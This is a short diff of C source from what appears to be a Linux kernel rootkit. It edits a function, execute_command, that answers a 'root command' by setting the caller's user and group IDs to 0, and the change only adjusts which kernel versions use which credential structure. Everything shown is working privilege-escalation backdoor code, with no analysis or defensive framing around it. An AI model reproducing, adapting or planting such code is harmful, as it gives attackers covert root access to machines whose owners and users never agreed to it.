@@ -995,12 +995,14 @@ int execute_command(const char __user *str, size_t length)
 	struct cred *creds = prepare_creds();
         pr_info("Got root command\n");
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 5, 0)
+//#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 5, 0)
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 13, 0)
         
         creds->uid = creds->euid = 0;
         creds->gid = creds->egid = 0;
         
-#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0)
+//#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0)
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 13, 0)
 
         creds->uid.val = creds->euid.val = 0;
         creds->gid.val = creds->egid.val = 0;
